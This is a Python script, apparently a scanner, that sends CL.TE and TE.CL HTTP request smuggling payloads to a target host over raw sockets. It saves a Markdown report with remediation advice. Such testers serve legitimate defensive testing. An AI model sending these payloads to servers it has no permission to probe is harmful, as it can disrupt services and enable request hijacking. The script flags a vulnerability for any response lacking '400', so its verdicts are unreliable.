#!/usr/bin/env python3
"""
HTTP Request Smuggling Tester
Tests for HTTP request smuggling vulnerabilities (CL.TE, TE.CL, TE.TE).
"""

import sys
import socket
from typing import List

class HTTPRequestSmugglingTester:
    def __init__(self, host: str, port: int = 80):
        self.host = host
        self.port = port
    
    def create_cl_te_payload(self, path: str = '/') -> bytes:
        """Create CL.TE (Content-Length: Transfer-Encoding) payload"""
        payload = f"""POST {path} HTTP/1.1\r
Host: {self.host}\r
Content-Length: 13\r
Transfer-Encoding: chunked\r
\r
0\r
\r
SMUGGLED"""
        return payload.encode()
    
    def create_te_cl_payload(self, path: str = '/') -> bytes:
        """Create TE.CL (Transfer-Encoding: Content-Length) payload"""
        payload = f"""POST {path} HTTP/1.1\r
Host: {self.host}\r
Transfer-Encoding: chunked\r
Content-Length: 3\r
\r
0\r
\r
SMUGGLED"""
        return payload.encode()
    
    def send_payload(self, payload: bytes) -> str:
        """Send payload and receive response"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((self.host, self.port))
            sock.send(payload)
            
            response = sock.recv(4096).decode('utf-8', errors='ignore')
            sock.close()
            return response
        except Exception as e:
            return f"Error: {e}"
    
    def test_smuggling(self) -> dict:
        """Test for HTTP request smuggling"""
        print(f"[*] Testing HTTP request smuggling on {self.host}:{self.port}...")
        
        results = {
            'cl_te': False,
            'te_cl': False
        }
        
        # Test CL.TE
        print("[*] Testing CL.TE...")
        cl_te_payload = self.create_cl_te_payload()
        response = self.send_payload(cl_te_payload)
        if 'SMUGGLED' in response or '400' not in response:
            print("[+] Potential CL.TE vulnerability detected!")
            results['cl_te'] = True
        
        # Test TE.CL
        print("[*] Testing TE.CL...")
        te_cl_payload = self.create_te_cl_payload()
        response = self.send_payload(te_cl_payload)
        if 'SMUGGLED' in response or '400' not in response:
            print("[+] Potential TE.CL vulnerability detected!")
            results['te_cl'] = True
        
        return results
    
    def generate_report(self) -> str:
        """Generate HTTP request smuggling test report"""
        results = self.test_smuggling()
        
        report = f"# HTTP Request Smuggling Test Report for {self.host}:{self.port}\n\n"
        
        if results['cl_te'] or results['te_cl']:
            report += "⚠️ **VULNERABLE**: HTTP request smuggling vulnerability detected!\n\n"
            if results['cl_te']:
                report += "- **CL.TE** (Content-Length: Transfer-Encoding) vulnerability found\n"
            if results['te_cl']:
                report += "- **TE.CL** (Transfer-Encoding: Content-Length) vulnerability found\n"
            report += "\n"
        else:
            report += "✅ No HTTP request smuggling vulnerability detected.\n\n"
        
        report += "## Attack Types\n\n"
        report += "### CL.TE (Content-Length: Transfer-Encoding)\n"
        report += "Frontend uses Content-Length, backend uses Transfer-Encoding\n\n"
        report += "### TE.CL (Transfer-Encoding: Content-Length)\n"
        report += "Frontend uses Transfer-Encoding, backend uses Content-Length\n\n"
        
        report += "## Recommendations\n\n"
        report += "1. Use HTTP/2 or disable HTTP/1.1 connection reuse\n"
        report += "2. Normalize requests at reverse proxy\n"
        report += "3. Reject ambiguous requests\n"
        report += "4. Use same server for frontend and backend\n"
        report += "5. Disable HTTP/1.1 connection reuse\n\n"
        
        return report

def main():
    if len(sys.argv) < 2:
        print("Usage: python http_request_smuggling.py <host> [port]")
        print("Example: python http_request_smuggling.py example.com 80")
        sys.exit(1)
    
    host = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 80
    
    tester = HTTPRequestSmugglingTester(host, port)
    
    report = tester.generate_report()
    
    filename = f"http_smuggling_test_{host.replace('.', '_')}.md"
    with open(filename, 'w') as f:
        f.write(report)
    
    print(f"[+] HTTP request smuggling testing complete")
    print(f"[+] Report saved to {filename}")
    print(f"[!] WARNING: Only test applications you own or have permission to test!")

if __name__ == '__main__':
    main()

